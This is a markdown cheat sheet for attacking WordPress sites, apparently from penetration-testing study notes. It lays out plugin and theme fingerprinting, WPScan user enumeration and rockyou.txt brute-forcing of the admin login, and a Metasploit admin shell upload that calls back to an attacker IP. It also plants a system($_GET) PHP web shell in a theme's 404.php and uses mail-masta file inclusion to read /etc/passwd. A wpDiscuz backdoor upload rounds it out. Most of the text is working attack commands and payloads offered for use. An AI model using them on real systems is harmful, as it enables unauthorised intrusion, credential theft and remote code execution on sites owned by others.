### <span style="color:#50FA7B">General Information :</span>
```bash
# Identify Theme:
curl -s http://target.com | grep themes
# Look for theme name (e.g., business-gravity, transport-gravity)

# Identify Plugins:
curl -s http://target.com | grep plugins
# Look for known plugins (e.g., contact-form-7, mail-masta, wpdiscuz) and version in the URL.
# Sometimes you can access: http://target.com/wp-content/plugins/plugin-name/readme.txt
```

## <span style="color:#8BE9FD">WPscan</span>

```bash
# Enumerate users on the WordPress site at http://$VICTIM_IP
wpscan --url http://$VICTIM_IP --enumerate u

# Enumerate vulnerable plugins on example.com with mixed detection method
# Using a valid WPScan API token for vulnerability database access
wpscan --url example.com -e vp --plugins-detection mixed --api-token API_TOKEN

# Enumerate users (-e u) on example.com and attempt password brute-forcing
# Using the rockyou.txt password list for cracking
wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt

# Brute-force login on example.com for user 'admin' (-U admin) with rockyou.txt passwords (-P)
wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt

# Get API Key (free): Register at https://wpvulndb.com Use it with --api-token
wpscan --url http://target.com --enumerate --api-token YOUR_TOKEN
```

## <span style="color:#8BE9FD">Metasploit Shell Upload</span>
```bash
use exploit/unix/webapp/wp_admin_shell_upload
set username john
set password firebird1
set lhost $ATTACKER_IP
set rhost $VICTIM_IP
set vhost blog.$DOMAIN
exploit
```

## <span style="color:#8BE9FD">Code Execution via Theme Editor (RCE)</span>
- Log in to WordPress
- Go to Appearance > Theme Editor
- Select an inactive theme (e.g., Twenty Nineteen)
- Edit the 404.php file
- Add this code:
```bash
system($_GET[0]);
```
This will let us run system commands like id using a GET request.

- Visit this URL to test:

```bash
http://blog.$DOMAIN/wp-content/themes/twentynineteen/404.php?0=id
```


## <span style="color:#8BE9FD">Vulnerable Plugins</span>

### <span style="color:#50FA7B">`mail-masta`</span>
This plugin has a bug that lets us read any file on the server.
```bash
curl http://blog.$DOMAIN/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
✅ You can read the /etc/passwd file, which lists system users.

### <span style="color:#50FA7B">`wpDiscuz` (Version 7.0.4)</span>
This plugin allows file uploads. But a bug lets us upload a PHP backdoor instead of just images.
```bash
python3 wp_discuz.py -u http://blog.$DOMAIN -p /?p=1
```
If successful, it uploads a PHP shell to:
```bash
/wp-content/uploads/2021/08/<random_name>.php

# You can run commands using:
curl http://blog.$DOMAIN/wp-content/uploads/2021/08/<filename>.php?cmd=id
```


## <span style="color:#8BE9FD">CVE-2021-29447</span>

when you logged in to admin panel then you can upload media files but its restricted in wordpress 5.6 version so you can use this exploit 

https://github.com/0xRar/CVE-2021-29447-PoC